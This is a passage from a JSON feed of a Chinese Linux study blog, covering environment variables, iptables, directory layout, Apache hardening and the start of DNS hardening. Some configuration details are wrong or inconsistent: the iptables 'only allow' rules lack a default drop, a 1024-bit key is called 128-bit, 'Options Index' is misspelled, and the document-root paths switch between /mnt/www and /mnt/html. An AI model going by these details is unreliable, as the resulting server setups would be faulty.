【系统环境变量的查看与配置】</h2>\n<div><p>需求</p>\n<p>查看当前的系统环境变量配置【共两条命令】</p>\n</div>\n<div><pre><code><span>env</span>\n<span># or</span>\n<span>echo</span> <span>$PATH</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>需求</p>\n<p>将 <code>/tmp</code> 目录添加至系统 <code>$PATH</code> 变量中【共一条命令】</p>\n</div>\n<div><pre><code><span><span>PATH</span></span><span>=</span><span>$PATH</span>:/tmp\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"【iptables-规则】\" tabindex=\"-1\"> 【iptables 规则】</h2>\n<div><p>需求</p>\n<p>设置 iptables 规则, 只允许 80 端口和 22 端口通过防火墙【共两条命令】</p>\n</div>\n<div><pre><code>iptables -A INPUT -p tcp --dport <span>22</span> -j ACCEPT\niptables -A INPUT -p tcp --dport <span>80</span> -j ACCEPT\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div>",
      "date_published": "2017-09-03T20:46:08.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 学习笔记（一）目录结构说明",
      "url": "https://vxhly.github.io/views/liunx/liunx-directory-structure.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-directory-structure.html",
      "summary": "前言\n接触了 Liunx 也有一段时间了, 也算对 Liunx 有一定的了解, 在这里将陆续的推出 Liunx 的学习笔记系列, 做个记录, 方便以后忘记有处可循。Liunx 是以文件系统为主的, 所以 Liunx 下的每一个目录都有其各自的作用, 则本篇将介绍 Liunx 的各个目录结构及其说明。\n\n",
      "content_html": "<div><p>前言</p>\n<p>接触了 Liunx 也有一段时间了, 也算对 Liunx 有一定的了解, 在这里将陆续的推出 Liunx 的学习笔记系列, 做个记录, 方便以后忘记有处可循。Liunx 是以文件系统为主的, 所以 Liunx 下的每一个目录都有其各自的作用, 则本篇将介绍 Liunx 的各个目录结构及其说明。</p>\n</div>\n\n<h2 id=\"目录结构图\" tabindex=\"-1\"> 目录结构图</h2>\n<p><img src=\"/assets/liunx-directory-structure.png\" alt=\"目录结构图\"></p>\n<h2 id=\"目录结构说明\" tabindex=\"-1\"> 目录结构说明</h2>\n<table>\n<thead>\n<tr>\n<th>目录</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>/</strong></td>\n<td>根目录。在 <code>Windows</code> , <code>DOS</code> 或者其他类似的操作系统里面, 每个分区都会有一个相应的根目录。但是 <code>Linux</code> 和其他 <code>UNIX</code> 系统则把所有的文件都放在一个目录树里面, <code>/</code> 就是唯一的根目录。一般来讲, 根目录下面很少保存什么文件, 或者只有一个内核映像在这里。</td>\n</tr>\n<tr>\n<td><strong>/boot</strong></td>\n<td>很多 <code>Linux</code> 系统把内核映像和其他一些和启动有关的文件都放在这里。</td>\n</tr>\n<tr>\n<td><strong>/tmp</strong></td>\n<td>一般只有启动时产生的临时文件才会放在这个地方。我们自己的临时文件都放在 <code>/var/tmp</code> 。</td>\n</tr>\n<tr>\n<td><strong>/mnt</strong></td>\n<td>这个目录下面放着一些用来安装其他设备的子目录, 比如说 <code>/mnt/cdrom</code> 或者 <code>/mnt/floppy</code> 。在有些 <code>Linux</code> 中这个目录被 <code>/mount</code> 代替。</td>\n</tr>\n<tr>\n<td><strong>/lib</strong></td>\n<td>启动的时候所要用到的库文件都放在这个目录下。那些非启动用的库文件都会放在 <code>/usr/lib</code> 下。内核模块是放在 <code>/lib/modules/</code> （内核版本）下的。</td>\n</tr>\n<tr>\n<td><strong>/proc</strong></td>\n<td>这个目录在磁盘上其实是不存在的。里面的文件都是关于当前系统的状态, 包括正在运行的进程、硬件状态、内存使用的多少等。</td>\n</tr>\n<tr>\n<td><strong>/dev</strong></td>\n<td>这个目录下保存着所有的设备文件。里面有一些是由 <code>Linux</code> 内核创建的用来控制硬件设备的特殊文件。</td>\n</tr>\n<tr>\n<td><strong>/var</strong></td>\n<td>这里有一些被系统改变过的数据。比如说 <code>/var/tmp</code> , 就是用来储存临时文件的。还有很多其他的进程和模块把它们的记录文件也放在这个地方, 包括如下一些重要的子目录</td>\n</tr>\n<tr>\n<td><strong>/var/log</strong></td>\n<td>这里放着绝大部分的记录文件。随着时间的增长, 这个目录会变得很庞大, 所以要定期清理。</td>\n</tr>\n<tr>\n<td><strong>/var/run</strong></td>\n<td>包括了各种运行时的信息。</td>\n</tr>\n<tr>\n<td><strong>/var/lib</strong></td>\n<td>包括了一些系统运行时需要的文件。</td>\n</tr>\n<tr>\n<td><strong>/var/spool</strong></td>\n<td>邮件, 新闻, 打印序列的所在地。</td>\n</tr>\n<tr>\n<td><strong>/root</strong></td>\n<td><code>root</code> 用户的主目录。</td>\n</tr>\n<tr>\n<td><strong>/home</strong></td>\n<td>一般用户的主目录都会放在这个目录下。在 <code>Linux</code> 下, 可以通过 <code>#cd ~</code> 来进入自己的主目录。</td>\n</tr>\n<tr>\n<td><strong>/etc</strong></td>\n<td>这里保存着绝大部分的系统配置文件。相对来讲, 单个用户的系统配置文件会保存在这个用户自己的主目录里面。下面列举其中一些重要的子目录。</td>\n</tr>\n<tr>\n<td><strong>/etc/X11</strong></td>\n<td>这里放着 X 窗口系统（ <code>Linux</code> 中的图形用户界面系统）所需要的配置文件。 <code>XF86Config</code> 就是把配置储存到这个地方的。 <code>/etc/X11/fonts</code> 里面放着一些服务器需要的字体, 还存放一些窗口管理器存放的配置文件。</td>\n</tr>\n<tr>\n<td><strong>/etc/init.d</strong></td>\n<td>这个目录保存着启动描述文件, 包括各种模块和服务的加载描述。所以如果不清楚的话, 千万不要随便删除其中的文件, 这里存放的文件都是系统自动进行配置的, 不需要用户配置。</td>\n</tr>\n<tr>\n<td><strong>/etc/rcS.d</strong></td>\n<td>这里放着一些连接到 <code>/etc/init.d</code> 的文件, 根据 <code>runlevel</code> 的不同而执行相应的描述。这里的文件名都是由 <code>S</code> 来开头的, 然后是一个两位的数字----表示各种服务启动的顺序。比如, <code>S24foo</code> 就是在 <code>S42bar</code> 前面执行的。接着就是相应的连接到 <code>/etc/init.d</code> 下面的文件名字了。</td>\n</tr>\n<tr>\n<td><strong>/etc/rc0.d - /etc/rc6.d</strong></td>\n<td>这里面也是一些连接文件, 和 <code>/etc/rcS.d</code> 差不多。不同的是, 这些只会在指定的 <code>runlevel</code> 下运行相应的描述。 <code>0</code> 表示关机, <code>6</code> 表示重启。所有以 <code>K</code> 开头的文件表示关闭, 所有以 <code>S</code> 开头的文件表示重启。目前来讲, 文件的命名方式和 <code>/etc/rcS.d</code> 是一样的。</td>\n</tr>\n<tr>\n<td><strong>/bin, /sbin</strong></td>\n<td>这里分别放着启动时所需要的普通程序和系统程序。很多程序在启动以后也很有用, 它们放在这个目录下是因为它们经常要被其他程序调用。</td>\n</tr>\n<tr>\n<td><strong>/usr</strong></td>\n<td>这是一个很复杂、庞大的目录。除了上述目录之外, 几乎所有的文件都存放在这下面。下面列举其中一些重要的子目录。</td>\n</tr>\n<tr>\n<td><strong>/usr/X11R6, /usr/X11, /usr/Xfree86</strong></td>\n<td>这里保存着 X 窗口系统所需要的文件, 它的目录结构和 <code>/usr</code> 是一样的。</td>\n</tr>\n<tr>\n<td><strong>/usr/bin</strong></td>\n<td>二进制可执行文件存放的目录, 这里放着绝大部分的应用程序。</td>\n</tr>\n<tr>\n<td><strong>/usr/sbin</strong></td>\n<td>这里放着绝大部分的系统程序。</td>\n</tr>\n<tr>\n<td><strong>/usr/games</strong></td>\n<td>游戏程序和相应的数据会放在这里。</td>\n</tr>\n<tr>\n<td><strong>/usr/include</strong></td>\n<td>这个目录保存着 <code>C</code> 和 <code>C++</code> 的头文件。</td>\n</tr>\n<tr>\n<td><strong>/usr/lib</strong></td>\n<td>启动时用不到的库文件都会放在这里。</td>\n</tr>\n<tr>\n<td><strong>/usr/info</strong></td>\n<td>这里保存着 <code>GNU Info</code> 程序所需要的数据。</td>\n</tr>\n<tr>\n<td><strong>/usr/man</strong></td>\n<td>这里保存着 <code>man</code> 程序所需要的数据。</td>\n</tr>\n<tr>\n<td><strong>/usr/src</strong></td>\n<td>这里保存着源代码文件。</td>\n</tr>\n<tr>\n<td><strong>/usr/doc</strong></td>\n<td>这里保存着各种文档文件。这些文件可以帮助你了解 <code>Linux</code> , 解决问题和提供一些技巧。</td>\n</tr>\n<tr>\n<td><strong>/usr/local</strong></td>\n<td>这里保存着本地计算机所需要的文件。在用户进行远程访问的时候特别有意义。这个目录在有些 <code>Linux</code> 系统下就是一个单独的分区, 存放一些这台机子所属的那个用户的文件。里面的结构和 <code>/usr</code> 是一样的。</td>\n</tr>\n<tr>\n<td><strong>/usr/shared, /usr/share</strong></td>\n<td>这里保存着各种共享文件。</td>\n</tr>\n</tbody>\n</table>\n",
      "image": "https://vxhly.github.io/assets/liunx-directory-structure.png",
      "date_published": "2016-09-08T19:35:12.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 服务配置笔记（四）APACHE 服务安全配置",
      "url": "https://vxhly.github.io/views/liunx/liunx-service-apache.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-service-apache.html",
      "summary": "前言\n本篇是 Liunx 的服务配置笔记系列第四篇, 这一篇将具体介绍 Red Hat Liunx 下 APACHE 服务的安全配置。所谓 APACHE 就是一个 WEB 服务器, 为 WEB 网页提供服务。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的服务配置笔记系列第四篇, 这一篇将具体介绍 Red Hat Liunx 下 APACHE 服务的安全配置。所谓 APACHE 就是一个 WEB 服务器, 为 WEB 网页提供服务。</p>\n</div>\n\n<h2 id=\"配置文件的位置\" tabindex=\"-1\"> 配置文件的位置</h2>\n<p>主配置文件: <strong>/etc/httpd/conf/httpd.conf</strong></p>\n<h2 id=\"服务的启动与停止\" tabindex=\"-1\"> 服务的启动与停止</h2>\n<div><p>提示</p>\n<p>APACHE 的服务名并不叫做 <code>http</code> , 而是 <code>httpd</code> 。<br> 修改配置文件过后一定要重启 <code>httpd</code> 服务。</p>\n</div>\n<div><pre><code><span>service</span> httpd status        <span># 状态</span>\n<span>service</span> httpd start         <span># 启动</span>\n<span>service</span> httpd stop          <span># 暂停</span>\n<span>service</span> httpd restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h2 id=\"安全配置\" tabindex=\"-1\"> 安全配置</h2>\n<h3 id=\"修改网站的根目录\" tabindex=\"-1\"> 修改网站的根目录</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code>DocumentRoot <span>\"/var/www/html\"</span>\n<span>&lt;</span>Directory <span>\"/var/www/html\"</span><span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><div><p>提示</p>\n<p>APACHE 默认配置的网站根目录是在 <code>/var/www/html</code> 下, 我们可以根据需求修改它。修改这个配置项的时候, 还需同时修改 <code>&lt;Directory &quot;/var/www/html&quot;&gt;</code> 这个配置项。</p>\n</div>\n<p>修改主配置文件</p>\n<div><pre><code>DocumentRoot <span>\"/mnt/www\"</span>\n<span>&lt;</span>Directory <span>\"/mnt/www/\"</span><span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h4 id=\"使用客户端进行验证\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。使用浏览器打开即可。</p>\n<p>验证之前, 还需创建网站存放的目录, 然后在创建一个测试的网页进行测试。</p>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> /mnt/www/\n<span>echo</span> <span>\"this is test.\"</span> <span>>></span> /mnt/www/index.html\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>接下来, 在浏览器里输入你的服务器的 <code>IP</code> 地址就可以访问了。<br></p>\n<p><img src=\"/assets/liunx-apache-2.png\" alt=\"APACHE 服务安全配置\"></p>\n<h3 id=\"配置目录的别名\" tabindex=\"-1\"> 配置目录的别名</h3>\n<p>修改主配置文件</p>\n<p>目录别名设置, 就是浏览器访问 <code>http://[host]/test</code> 时, 实际上访问的是 <code>/var/www/html/test</code> 目录。</p>\n<div><pre><code>Alias /test <span>\"/var/www/html/test\"</span>\n\n<span>&lt;</span>Directory<span>></span>\n  Options Indexes\n  Order allow,deny\n  allow from all\n<span>&lt;</span>/Directory<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-apache-3.png\" alt=\"APACHE 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证-1\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。使用浏览器打开即可。这时候就需要跟上目录名了。</p>\n<p>验证之前, 还需要创建测试目录和测试网站文件。</p>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> /var/www/html/test\n<span>echo</span> <span>\"dir dir dir dir.\"</span> <span>>></span> /var/www/html/index.html\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>接下来, 在浏览器里输入 <code>IP/test</code> 就可以访问了。注意大小写敏感。<br></p>\n<p><img src=\"/assets/liunx-apache-4.png\" alt=\"APACHE 服务安全配置\"></p>\n<h3 id=\"关闭版本信息的显示\" tabindex=\"-1\"> 关闭版本信息的显示</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code>ServerSignature On\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>如果你访问一个不存在的目录, 默认是会显示 APACHE 的版本信息, 这是很不安全的, 建议关掉, 注意大小写敏感。还可以设置为 <code>Off</code> 和 <code>EMail</code> 。其中 <code>Off</code> 是隐藏信息, <code>EMail</code> 是会显示管理员的 email 信息的。</p>\n<p>修改主配置文件</p>\n<div><pre><code>ServerSignature Off\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"使用客户端进行验证-2\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>先看一下, 没有进行修改之前会显示什么吧！随便写一个目录, 访问它吧！</p>\n<p><img src=\"/assets/liunx-apache-5.png\" alt=\"APACHE 服务安全配置\"></p>\n<p>修改好配置之后, 重新访问, 再次看一下有没有吧！</p>\n<p><img src=\"/assets/liunx-apache-6.png\" alt=\"APACHE 服务安全配置\"></p>\n<h3 id=\"禁用目录浏览、符号连接追踪\" tabindex=\"-1\"> 禁用目录浏览、符号连接追踪</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>&lt;</span>Directory <span>\"/var/www/html\"</span><span>></span>\n  Options Index FollowSymLinks\n  AllowOverride None\n  Order allow,deny\n  Allow from all\n<span>&lt;</span>/Directory<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>Index</code> 是定义是否开启目录浏览, 默认开启, 要关闭只需添加 <code>-</code> ； <code>FollowSymLinks</code> 是定义是否符号连接追踪, 默认开启, 要关闭只需添加 <code>-</code> 。</p>\n<p>修改主配置文件</p>\n<p>由于之前修改过网站根目录, 所以在这里直接使用。</p>\n<div><pre><code><span>&lt;</span>Directory <span>\"/mnt/html\"</span><span>></span>\n  Options -Index -FollowSymLinks\n  AllowOverride None\n  Order allow,deny\n  Allow from all\n<span>&lt;</span>/Directory<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-apache-7.png\" alt=\"APACHE 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证-3\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<ul>\n<li>配置禁用目录浏览, 说白了就是当一个目录下没有类似于 <code>index.php</code> 、 <code>index.html</code> 、 <code>default.php</code> 、 <code>defaule.html</code> 等这样子的主页, APACHE 默认会把该目录下的目录结构给列出来, 禁用就是阻止其列出。</li>\n<li>配置禁用符号连接追踪, 说白了就是防止某个用户偶然创建的一个符号连接指向文件爱呢系统的某一部分。</li>\n<li>配置白名单, 其实就是限制一些 IP 地址, 让其不能访问 APACHE。</li>\n<li>这些配置, 在实际使用的过程中才会有体会, 这里就不再进行测试了。</li>\n</ul>\n<h3 id=\"开启白名单\" tabindex=\"-1\"> 开启白名单</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>&lt;</span>Directory <span>\"/var/www/html\"</span><span>></span>\n  Options Index FollowSymLinks\n  AllowOverride None\n  Order allow,deny\n  Allow from all\n<span>&lt;</span>/Directory<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>直接修改 <code>Allow from</code> 这一项, <code>Allow from</code> 是定义白名单, 默认是允许所有 IP 地址访问, 要限制只需把 <code>all</code> 替换成允许访问的 IP 地址就好。</p>\n<p>修改主配置文件</p>\n<div><pre><code><span>&lt;</span>Directory <span>\"/mnt/html\"</span><span>></span>\n  Options -Index -FollowSymLinks\n  AllowOverride None\n  Order allow,deny\n  Allow from <span>192.168</span>.1.0/24\n<span>&lt;</span>/Directory<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"限制-http-请求包上限\" tabindex=\"-1\"> 限制 http 请求包上限</h3>\n<p>HTTP 协议包包含请求包和应答包。HTTP 请求包(GET、POST 等请求方法)由三个部分构成, 分别是: <code>方法-URI-协议/版本</code> , 请求头即请求正文；HTTP 应答包和 HTTP 请求包相似, 由三个部分构成, 分别是: <code>协议-状态代码-描述</code> , 应答头即应答正文。</p>\n<h4 id=\"limitrequestline-指令\" tabindex=\"-1\"> LimitRequestLine 指令</h4>\n<p>设置 HTTP 请求行的字节数限制。</p>\n<p>LimitRequestLine 指令允许服务器管理员增加或减少客户端 HTTP 请求行允许大小的限制。因为请求行包括 HTTP 方法、URI、协议版本, 所以 LimitRequestLine 指令会限制请求 URI 的长度。服务器会需要这个值足够大以装载它所有的资源名, 包括可能在 GET 请求中所传递的查询部分的所有信息。</p>\n<p>这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。</p>\n<h4 id=\"limitrequestfieldsize-指令\" tabindex=\"-1\"> LimitRequestFieldSize 指令</h4>\n<p>指定 HTTP 请求头允许的字节大小。</p>\n<p>LimitRequestFieldSize 指令允许服务器管理员增加或减少 HTTP 请求头域大小的限制。一般来说, 服务器需要此值足够大, 以适应普通客户端的任何请求的头域大小。一个普通头域的大小对于不同的客户端来说是有很大差别的, 一般与用户配置他们的浏览器以支持更多的内容协议密切相关。SPNEGO 的认证头最大可能达到 12392 字节。</p>\n<p>这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。</p>\n<h4 id=\"示例配置\" tabindex=\"-1\"> 示例配置</h4>\n<p>默认配置中是没有 LimitRequestLine 指令和 LimitRequestFieldSize 指令, 需要手动添加</p>\n<div><pre><code>LimitRequestLine 1024k\nLimitRequestFieldSize 1024k\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/liunx-apache-15.png\" alt=\"APACHE 服务安全配置\"></p>\n<h2 id=\"配置-https\" tabindex=\"-1\"> 配置 https</h2>\n<p>HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议要比 http 协议安全。</p>\n<h3 id=\"生成密钥\" tabindex=\"-1\"> 生成密钥</h3>\n<div><pre><code>openssl genrsa <span>1024</span> <span>></span> server.key\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这是用 128 位 rsa 算法生成密钥, 得到 <code>server.key</code> 文件</p>\n<h3 id=\"生成证书请求文件\" tabindex=\"-1\"> 生成证书请求文件</h3>\n<div><pre><code>openssl req -new -key server.key <span>></span> server.csr\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这是用上面的密钥生成证书请求文件 <code>server.csr</code></p>\n<h3 id=\"生成证书\" tabindex=\"-1\"> 生成证书</h3>\n<div><pre><code>openssl req -x509 -days <span>365</span> -key server.key -in server.csr <span>></span> server.crt\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这是用前面生成的密钥和证书请求生成证书 <code>server.crt</code> , -days 参数指明证书有效期, 单位为天</p>\n<h3 id=\"生成证书和密钥的例子\" tabindex=\"-1\"> 生成证书和密钥的例子</h3>\n<p>注意路径, 记住它。</p>\n<p><img src=\"/assets/liunx-apache-9.png\" alt=\"APACHE 服务安全配置\"></p>\n<h3 id=\"确认是否安装-ssl-模块\" tabindex=\"-1\"> 确认是否安装 ssl 模块</h3>\n<p>只要确定系统中有 <code>mod_ssl.so</code> 文件, 就可以确定已经安装好 ssl 模块。记住路径吧！</p>\n<div><pre><code><span>find</span> / -iname <span>\"*mod_ssl.so*\"</span>    <span># 使用 find 命令进行搜索</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-apache-8.png\" alt=\"APACHE 服务安全配置\"></p>\n<h3 id=\"配置-httpd-ssl-conf-文件\" tabindex=\"-1\"> 配置 httpd-ssl.conf 文件</h3>\n<p>注意在此文件中配置证书和密钥, 注意路径, 这里就使用上面的路径。</p>\n<p>系统中可能没有此文件, 可以先创建它, <code>For Example:</code></p>\n<div><pre><code><span>vim</span> /etc/httpd/conf/httpd-ssl.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>修改主配置文件, 添加如下内容, <code>For Example:</code></p>\n<div><pre><code>SSLCertificateFile /home/server.crt\nSSLCertificateKeyFile /home/server.key\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"配置-httpd-conf-文件\" tabindex=\"-1\"> 配置 httpd.conf 文件</h3>\n<h4 id=\"虚拟机设置\" tabindex=\"-1\"> 虚拟机设置</h4>\n<p>修改主配置文件, <code>For Example:</code></p>\n<div><pre><code>NameVirtualHost *:443\n\n<span>&lt;</span>VirtualHost *:44<span><span>3</span>></span>\n  <span>..</span>.\n<span>&lt;</span>/VirtualHost<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-apache-10.png\" alt=\"APACHE 服务安全配置\"></p>\n<h4 id=\"修改主配置文件\" tabindex=\"-1\"> 修改主配置文件</h4>\n<p>打开 ssl 模块, 并引入配置文件</p>\n<p>修改主配置文件, <code>For Example:</code></p>\n<div><pre><code>LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so\nInclude <span>\"/etc/httpd/conf/httpd-ssl.conf\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/liunx-apache-11.png\" alt=\"APACHE 服务安全配置\"></p>\n<p>这里提供简洁方法, 在 vi 下使用 <code>:r !find / -iname &quot;*mod_ssl.so*&quot;</code> , 在配置文件中也可以很任性的将 <code>httpd-ssl.conf</code> 里的内容填入主配置文件。</p>\n<p>修改主配置文件, <code>For Example:</code></p>\n<div><pre><code>LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so\nSSLCertificateFile /home/server.crt\nSSLCertificateKeyFile /home/server.key\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>以上的配置写在任何地方均生效, 但要注意的是配置中可能没有以下选项, 需要手动添加, <code>For Example:</code></p>\n<div><pre><code>SSLEngine on\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>但是最好还是写在 <code>&lt;VirtualHost *:443&gt;&lt;/VirtualHost&gt;</code> 这个地方, <code>For Example:</code></p>\n<div><pre><code><span>&lt;</span>VirtualHost *:44<span><span>3</span>></span>\n  LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so\n  SSLEngine on\n  SSLCertificateFile /home/server.crt\n  SSLCertificateKeyFile /home/server.key\n<span>&lt;</span>/VirtualHost<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"将监听-80-端口注释\" tabindex=\"-1\"> 将监听 80 端口注释</h4>\n<p>如果不注释的话, 依然还可以通过 <code>http</code> 方式访问, 注释掉, 只能使用 <code>https</code> 方式访问。</p>\n<p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/liunx-apache-12.png\" alt=\"APACHE 服务安全配置\"></p>\n<h3 id=\"访问\" tabindex=\"-1\"> 访问</h3>\n<p>配置好了, 重启服务, 接下来就可以愉快的使用 <code>https</code> 来访问了。</p>\n<p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/liunx-apache-13.png\" alt=\"APACHE 服务安全配置\"></p>\n",
      "image": "https://vxhly.github.io/assets/liunx-apache-2.png",
      "date_published": "2016-09-19T14:58:33.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 服务配置笔记（六）DNS 服务安全配置",
      "url": "https://vxhly.github.io/views/liunx/liunx-service-dns.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-service-dns.html",
      "summary": "前言\n这篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 DNS 服务的安全配置。所谓 DNS 就是一个域名解析服务器, 其中 DNS 还包含正向解析和反向解析。\n\n",
      "content_html": "<div><p>前言</p>\n<p>这篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 DNS 服务的安全配置。所谓 DNS 就是一个域名解析服务器, 其中 DNS 还包含正向解析和反向解析。</p>\n</div>\n\n<h2 id=\"服务的安装\" tabindex=\"-1\"> 服务的安装</h2>\n<h3 id=\"创建挂载目录\" tabindex=\"-1\"> 创建挂载目录</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> -p /mnt/cdrom\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"挂在光盘\" tabindex=\"-1\"> 挂在光盘</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装\" tabindex=\"-1\"> 安装</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>cd</span> /mnt/cdrom/Server\n<span>rpm</span> -ivh bind-9.3.6-4.P1.el5_4.2.i386.rpm\n<span>rpm</span> -ivh caching-namedserver-9.3.6-4.P1.el5_4.2.i386.rpm\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-dns-1.png\" alt=\"DNS\"></p>\n<h3 id=\"复制模板配置文件\" tabindex=\"-1\"> 复制模板配置文件</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>cd</span> /etc/\n<span>cp</span> -p named.caching-nameserver.conf named.conf\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/liunx-dns-2.png\" alt=\"DNS\"></p>\n<p>复制的时候, 建议带上 <code>-p</code> 选项, 否则不能使用该文件, 如果忘记加上 <code>-p</code> 选项, 不要紧, 使用以下命令还可以挽救。</p>\n<div><pre><code><span>chown</span> named:named named.conf\n<span>chown</span> named:named named.zones\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"安全配置\" tabindex=\"-1\"> 安全配置</h2>\n<h3 id=\"限制递归查询功能\" tabindex=\"-1\"> 限制递归查询功能</h3>\n<p>默认没有这个功能, 需要手动添加。递归查询指 一般客户机和服务器之间属 递归查询 , 即当客户机向 DNS 服务器发 出请求后, 若 DNS 服务器本身不能解析, 则会向另外的 DNS 服务 器发出查询请求, 得到结果后转交给客户机。<br> 这个选项, 即可填 IP 地址, 也可以填网络段, 当然也可以填 any（所有）。</p>\n<p>修改主配置文件</p>\n<div><pre><code>allow-recursion <span>{</span> <span>192.168</span>.199.0/24<span>;</span><span>}</span><span>;</span>  <span># 限制网段查询</span>\nallow-recursion <span>{</span> <span>192.168</span>.199.2<span>;</span><span>}</span><span>;</span>     <span># 限制 IP 查询</span>\nallow-recursion <span>{</span> any<span>;</span><span>}</span><span>;</span>               <span># 所有的都可以查询</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-dns-3.png\" alt=\"DNS\"></p>\n<h3 id=\"限制查询\" tabindex=\"-1\"> 限制查询</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code>allow-query <span>{</span> localhost<span>;</span><span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>allow-query 配置项用来设置允许 DNS 查询的客户端地址, 默认的客户端地址为本机。这里可以设置为某个网段、所有、具体的某台主机三种情况。</p>\n<p>修改主配置文件</p>\n<div><pre><code>allow-query <span>{</span> <span>192.168</span>.199.0/24<span>;</span><span>}</span><span>;</span>  <span># 限制网段查询</span>\nallow-query <span>{</span> <span>192.168</span>.199.2<span>;</span><span>}</span><span>;</span>     <span># 限制 IP 查询</span>\nallow-query <span>{</span> any<span>;</span><span>}</span><span>;</span>               <span># 所有的都可以查询</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-dns-4.png\" alt=\"DNS\"></p>\n<h3 id=\"限制区传送\" tabindex=\"-1\"> 限制区传送</h3>\n<p>默认没有这个功能, 需要手动添加。如果没有限制区传送, 那么 DNS 服务器允许对任何人都进行区域传输, 因此网络架构中的主机名、主机 IP 列表、路由器名和路由 IP 列表, 甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到在 DNS 配置文件中通过设置来限制允许区传送的主机, 